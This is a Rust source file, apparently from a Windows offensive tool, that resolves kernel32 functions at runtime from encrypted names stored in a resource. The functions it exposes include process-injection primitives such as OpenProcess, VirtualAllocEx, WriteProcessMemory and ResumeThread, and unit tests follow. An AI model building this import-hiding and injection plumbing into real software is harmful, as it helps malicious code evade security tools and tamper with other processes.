pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usize {
    let createToolhelp32Snapshot: FnCreateToolhelp32Snapshot =
        std::mem::transmute(GetProcAddressX(
            GetModuleHandleX(
                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
            ),
            get_resource_bytes(
                RESOURCE_ID,
                CREATETOOLHELP32SNAPSHOT_POS,
                CREATETOOLHELP32SNAPSHOT_LEN,
            ),
            get_resource_bytes(
                RESOURCE_ID,
                CREATETOOLHELP32SNAPSHOT_KEY,
                CREATETOOLHELP32SNAPSHOT_LEN,
            ),
        ));

    createToolhelp32Snapshot(dwFlags, th32ProcessID)
}

pub unsafe fn FreeConsole() -> u32 {
    let freeConsole: FnFreeConsole = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "FreeConsole".as_bytes(),
    ));

    freeConsole()
}

//FindResourceA

pub unsafe fn GetCurrentProcess() -> usize {
    let getCurrentProcess: FnGetCurrentProcess = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, GETCURRENTPROCESS_POS, GETCURRENTPROCESS_LEN),
        get_resource_bytes(RESOURCE_ID, GETCURRENTPROCESS_KEY, GETCURRENTPROCESS_LEN),
    ));

    getCurrentProcess()
}

pub unsafe fn GetFinalPathNameByHandleA(
    hFile: usize,
    lpszFilePath: *const u8,
    cchFilePath: u32,
    dwFlags: u32,
) -> u32 {
    let getFinalPathNameByHandleA: FnGetFinalPathNameByHandleA =
        std::mem::transmute(GetProcAddressInternal(
            GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
            "GetFinalPathNameByHandleA".as_bytes(),
        ));

    getFinalPathNameByHandleA(hFile, lpszFilePath, cchFilePath, dwFlags)
}

pub unsafe fn GetLastError() -> u32 {
    let getLastError: FnGetLastError = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, GETLASTERROR_POS, GETLASTERROR_LEN),
        get_resource_bytes(RESOURCE_ID, GETLASTERROR_KEY, GETLASTERROR_LEN),
    ));

    getLastError()
}

pub unsafe fn GetModuleHandleA(lpModuleName: *const u8) -> usize {
    let getModuleHandleA: FnGetModuleHandleA = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "GetModuleHandleA".as_bytes(),
    ));

    getModuleHandleA(lpModuleName)
}

pub unsafe fn GetModuleHandleW(lpModuleName: *const u16) -> usize {
    let getModuleHandleW: FnGetModuleHandleW = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "GetModuleHandleW".as_bytes(),
    ));

    getModuleHandleW(lpModuleName)
}

pub unsafe fn GetProcAddress(hModule: usize, lpProcName: *const u8) -> usize {
    let getProcAddress: FnGetProcAddress = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, GETPROCADDRESS_POS, GETPROCADDRESS_LEN),
        get_resource_bytes(RESOURCE_ID, GETPROCADDRESS_KEY, GETPROCADDRESS_LEN),
    ));

    getProcAddress(hModule, lpProcName)
}

pub unsafe fn GetSystemDirectoryA(lpBuffer: *mut u8, uSize: u32) -> u32 {
    let getSystemDirectoryA: FnGetSystemDirectoryA = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(
            RESOURCE_ID,
            GETSYSTEMDIRECTORYA_POS,
            GETSYSTEMDIRECTORYA_LEN,
        ),
        get_resource_bytes(
            RESOURCE_ID,
            GETSYSTEMDIRECTORYA_KEY,
            GETSYSTEMDIRECTORYA_LEN,
        ),
    ));

    getSystemDirectoryA(lpBuffer, uSize)
}

pub unsafe fn GetSystemDirectoryW(lpBuffer: *mut u16, uSize: u32) -> u32 {
    let getSystemDirectoryW: FnGetSystemDirectoryW = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(
            RESOURCE_ID,
            GETSYSTEMDIRECTORYW_POS,
            GETSYSTEMDIRECTORYW_LEN,
        ),
        get_resource_bytes(
            RESOURCE_ID,
            GETSYSTEMDIRECTORYW_KEY,
            GETSYSTEMDIRECTORYW_LEN,
        ),
    ));

    getSystemDirectoryW(lpBuffer, uSize)
}

pub unsafe fn IsProcessorFeaturePresent(ProcessorFeature: u32) -> u32 {
    let isProcessorFeaturePresent: FnIsProcessorFeaturePresent =
        std::mem::transmute(GetProcAddressInternal(
            GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
            "IsProcessorFeaturePresent".as_bytes(),
        ));

    isProcessorFeaturePresent(ProcessorFeature)
}

pub unsafe fn LoadLibraryA(lpLibFileName: *const u8) -> usize {
    let loadLibraryA: FnLoadLibraryA = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_POS, LOADLIBRARYA_LEN),
        get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN),
    ));

    loadLibraryA(lpLibFileName)
}

// LoadResource

// LockResource

pub unsafe fn OpenFile(lpFileName: *const u8, lpReOpenBuff: *const OFSTRUCT, uStyle: u32) -> i32 {
    let openFile: FnOpenFile = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, OPENFILE_POS, OPENFILE_LEN),
        get_resource_bytes(RESOURCE_ID, OPENFILE_KEY, OPENFILE_LEN),
    ));

    openFile(lpFileName, lpReOpenBuff, uStyle)
}

pub unsafe fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize {
    let openProcess: FnOpenProcess = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, OPENPROCESS_POS, OPENPROCESS_LEN),
        get_resource_bytes(RESOURCE_ID, OPENPROCESS_KEY, OPENPROCESS_LEN),
    ));

    openProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
}

pub unsafe fn Process32First(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32 {
    let process32First: FnProcess32First = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, PROCESS32FIRST_POS, PROCESS32FIRST_LEN),
        get_resource_bytes(RESOURCE_ID, PROCESS32FIRST_KEY, PROCESS32FIRST_LEN),
    ));

    process32First(hSnapshot, lppe)
}

pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32 {
    let process32Next: FnProcess32Next = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, PROCESS32NEXT_POS, PROCESS32NEXT_LEN),
        get_resource_bytes(RESOURCE_ID, PROCESS32NEXT_KEY, PROCESS32NEXT_LEN),
    ));

    process32Next(hSnapshot, lppe)
}

pub unsafe fn ReadProcessMemory(
    hProcess: usize,
    lpBaseAddress: usize,
    lpBuffer: *mut u8,
    nSize: usize,
    lpNumberOfBytesRead: *mut usize,
) -> u32 {
    let readProcessMemory: FnReadProcessMemory = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "ReadProcessMemory".as_bytes(),
    ));

    readProcessMemory(
        hProcess,
        lpBaseAddress,
        lpBuffer,
        nSize,
        lpNumberOfBytesRead,
    )
}

pub unsafe fn ResumeThread(hThread: usize) -> u32 {
    let resumeThread: FnResumeThread = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, RESUMETHREAD_POS, RESUMETHREAD_LEN),
        get_resource_bytes(RESOURCE_ID, RESUMETHREAD_KEY, RESUMETHREAD_LEN),
    ));

    resumeThread(hThread)
}

pub unsafe fn SetStdHandle(nStdHandle: u32, hHandle: usize) -> u32 {
    let setStdHandle: FnSetStdHandle = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "SetStdHandle".as_bytes(),
    ));

    setStdHandle(nStdHandle, hHandle)
}

//SizeofResource

pub unsafe fn VirtualAlloc(
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize {
    let virtualAlloc: FnVirtualAlloc = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, VIRTUALALLOC_POS, VIRTUALALLOC_LEN),
        get_resource_bytes(RESOURCE_ID, VIRTUALALLOC_KEY, VIRTUALALLOC_LEN),
    ));

    virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
}

pub unsafe fn VirtualAllocEx(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize {
    let virtualAllocEx: FnVirtualAllocEx = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, VIRTUALALLOCEX_POS, VIRTUALALLOCEX_LEN),
        get_resource_bytes(RESOURCE_ID, VIRTUALALLOCEX_KEY, VIRTUALALLOCEX_LEN),
    ));

    virtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
}

pub unsafe fn VirtualFree(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize {
    let virtualFree: FnVirtualFree = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, VIRTUALFREE_POS, VIRTUALFREE_LEN),
        get_resource_bytes(RESOURCE_ID, VIRTUALFREE_KEY, VIRTUALFREE_LEN),
    ));

    virtualFree(lpAddress, dwSize, dwFreeType)
}

pub unsafe fn VirtualFreeEx(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    dwFreeType: u32,
) -> usize {
    let virtualFreeEx: FnVirtualFreeEx = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, VIRTUALFREEEX_POS, VIRTUALFREEEX_LEN),
        get_resource_bytes(RESOURCE_ID, VIRTUALFREEEX_KEY, VIRTUALFREEEX_LEN),
    ));

    virtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType)
}

pub unsafe fn VirtualProtect(
    lpAddress: usize,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> u32 {
    let virtualProtect: FnVirtualProtect = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, VIRTUALPROTECT_POS, VIRTUALPROTECT_LEN),
        get_resource_bytes(RESOURCE_ID, VIRTUALPROTECT_KEY, VIRTUALPROTECT_LEN),
    ));

    virtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
}

pub unsafe fn VirtualQuery(
    lpAddress: usize,
    lpBuffer: &mut MEMORY_BASIC_INFORMATION,
    dwLength: usize,
) -> usize {
    let virtualQuery: FnVirtualQuery = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "VirtualQuery".as_bytes(),
    ));

    virtualQuery(lpAddress, lpBuffer, dwLength)
}

pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
    let waitForSingleObject: FnWaitForSingleObject = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(
            RESOURCE_ID,
            WAITFORSINGLEOBJECT_POS,
            WAITFORSINGLEOBJECT_LEN,
        ),
        get_resource_bytes(
            RESOURCE_ID,
            WAITFORSINGLEOBJECT_KEY,
            WAITFORSINGLEOBJECT_LEN,
        ),
    ));

    waitForSingleObject(hProcess, dwMilliseconds)
}

pub unsafe fn WriteFile(
    hFile: usize,
    lpBuffer: *const u8,
    nNumberOfBytesToWrite: u32,
    lpNumberOfBytesWritten: *const u32,
    lpOverlapped: *const OVERLAPPED,
) -> u32 {
    let writeFile: FnWriteFile = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, WRITEFILE_POS, WRITEFILE_LEN),
        get_resource_bytes(RESOURCE_ID, WRITEFILE_KEY, WRITEFILE_LEN),
    ));

    writeFile(
        hFile,
        lpBuffer,
        nNumberOfBytesToWrite,
        lpNumberOfBytesWritten,
        lpOverlapped,
    )
}

pub unsafe fn WriteProcessMemory(
    hProcess: usize,
    lpAddress: usize,
    lpBuffer: *const u8,
    nSize: usize,
    lpNumberOfBytesWritten: usize,
) -> u32 {
    let writeProcessMemory: FnWriteProcessMemory = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, WRITEPROCESSMEMORY_POS, WRITEPROCESSMEMORY_LEN),
        get_resource_bytes(RESOURCE_ID, WRITEPROCESSMEMORY_KEY, WRITEPROCESSMEMORY_LEN),
    ));

    writeProcessMemory(hProcess, lpAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::util::strlenw;
    use crate::windows::pe::PE;
    use std::cmp::max;
    use std::mem::size_of;
    use std::{cmp, fs};

    #[test]
    fn geb_peb() {
        unsafe {
            let peb = get_peb();
            let peb_addr: usize = mem::transmute(peb);
            assert_ne!(peb_addr, 0);
        }
    }

    #[test]
    fn get_module_handle() {
        unsafe {
            let kernel32 = GetModuleHandleInternal("kernel32.dll".as_bytes());
            assert_ne!(kernel32, 0)
        }
    }

    #[test]
    fn get_proc_address() {
        unsafe {
            let load_library_a_addr = GetProcAddressInternal(
                GetModuleHandleInternal("kernel32.dll".as_bytes()),
                "LoadLibraryA".as_bytes(),
            );
            assert_ne!(load_library_a_addr, 0)
        }
    }

    fn get_function_ordinal(dll_name: &[u8], function_name: &[u8]) -> u16 {
        unsafe {
            let base_addr = GetModuleHandleA(dll_name.as_ptr());
            let dos_header: &IMAGE_DOS_HEADER = mem::transmute(base_addr);
            let nt_headers: &IMAGE_NT_HEADERS =
                mem::transmute(base_addr + dos_header.e_lfanew as usize);
            let export_dir =
                &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];

            let image_export_directory: &IMAGE_EXPORT_DIRECTORY =
                mem::transmute(base_addr + export_dir.VirtualAddress as usize);

            let name_dir = std::slice::from_raw_parts(
                (base_addr + image_export_directory.AddressOfNames as usize) as *const u32,
                image_export_directory.NumberOfNames as usize,
            );
            let ordinal_dir = std::slice::from_raw_parts(
                (base_addr + image_export_directory.AddressOfNameOrdinals as usize) as *const u16,
                image_export_directory.NumberOfNames as usize,
            );

            for i in 0..name_dir.len() {
                let name = std::slice::from_raw_parts(
                    (base_addr + name_dir[i] as usize) as *const u8,
                    strlen((base_addr + name_dir[i] as usize) as *const u8),
                );

                if name == function_name {
                    return ordinal_dir[i] + image_export_directory.Base as u16;
                }
            }
        }

        0u16
    }

    #[test]
    fn get_proc_address_by_ordinal() {
        unsafe {
            let ordinal =
                get_function_ordinal("KERNEL32.DLL\0".as_bytes(), "LoadLibraryA".as_bytes()) as u32;
            let load_library_a_address_ordinal = GetProcAddressInternal(
                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
                ordinal.to_le_bytes().as_slice(),
            );
            let load_library_a_address = GetProcAddressInternal(
                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
                "LoadLibraryA".as_bytes(),
            );
            let load_library: FnLoadLibraryA = mem::transmute(load_library_a_address_ordinal);

            assert_eq!(load_library_a_address_ordinal, load_library_a_address);
        }
    }

    #[test]
    fn get_fwd_proc_address() {
        unsafe {
            let pAcquireSRWLockExclusive = GetProcAddressInternal(
                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
                "AcquireSRWLockExclusive".as_bytes(),
            );
            assert_ne!(pAcquireSRWLockExclusive, 0)
        }
    }

    #[test]
    fn get_module_handle_x_test() {
        unsafe {
            let kernel32 = GetModuleHandleX(
                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
            );
            let kernel32_normal = GetModuleHandleA("KERNEL32.DLL\0".as_ptr());
            assert_eq!(kernel32, kernel32_normal);
        }
    }

    #[test]
    fn get_proc_address_x_test() {
        unsafe {
            let load_library_a_handle_x = GetProcAddressX(
                GetModuleHandleX(
                    get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
                    get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
                ),
                get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_POS, LOADLIBRARYA_LEN),
                get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN),
            );
            let load_library_a_handle = GetProcAddress(
                GetModuleHandleA("KERNEL32.DLL\0".as_ptr()),
                "LoadLibraryA\0".as_ptr(),
            );
            assert_eq!(load_library_a_handle_x, load_library_a_handle);
        }
    }

    #[test]
    fn get_system_directory_a() {
        unsafe {
            let mut buffer = [0; MAX_PATH + 1];
            let out = GetSystemDirectoryA(buffer.as_mut_ptr(), buffer.len() as u32);
            let path = String::from_utf8(buffer[..strlen(buffer.as_ptr())].to_vec()).unwrap();
            assert!(path.ends_with(r"\Windows\system32"))
        }
    }

    #[test]
    fn get_system_directory_w() {
        unsafe {
            let mut buffer = [0; MAX_PATH + 1];
            let out = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32);
            let path = String::from_utf16(&buffer[..strlenw(buffer.as_ptr())]).unwrap();
            assert!(path.ends_with(r"\Windows\system32"))
        }
    }

    fn patch_section_headers<'a>(buffer: &Vec<u8>) {
        unsafe {
            let base_address = buffer.as_ptr() as usize;
            let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(base_address);

            // Figure out the offset in the buffer to the NT header

            // Read the NT header to figure out how sections we have and how much RVA's + sizes so we
            // can determine the offset to the section headers;
            let nt_header: &'static IMAGE_NT_HEADERS =
                mem::transmute(base_address + pDosHdr.e_lfanew as usize);

            // Locate the section headers. Rust's IMAGE_NT_HEADERS64 assumes a fixed 16 RVA's but this might
            // be different in reality so we take care of the situation where it's less by manually
            // adjusting the offset.
            let section_base = addr_of!(*nt_header) as usize + size_of::<IMAGE_NT_HEADERS>();
            let section_header_length = cmp::min(nt_header.OptionalHeader.NumberOfRvaAndSizes, 16);
            let mut section_headers = std::slice::from_raw_parts_mut(
                section_base as *mut IMAGE_SECTION_HEADER,
                section_header_length as usize,
            );

            for section_header in section_headers {
                // Since we're dumping from memory we need to correct the PointerToRawData and SizeOfRawData
                // such that analysis tools can locate the sections again.
                section_header.SizeOfRawData = section_header.Misc.VirtualSize;
                section_header.PointerToRawData = section_header.VirtualAddress;
            }
        }
    }

    #[test]
    fn test_patch() {
        unsafe {
            let mut buffer = [0; MAX_PATH + 1];
            let out = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32);
            let path = String::from_utf16(&buffer[..strlenw(buffer.as_ptr())]).unwrap();
            let file = fs::read(format!("{path}/notepad.exe")).unwrap();
            let v = patch_section_headers(&file);
        }
    }
}
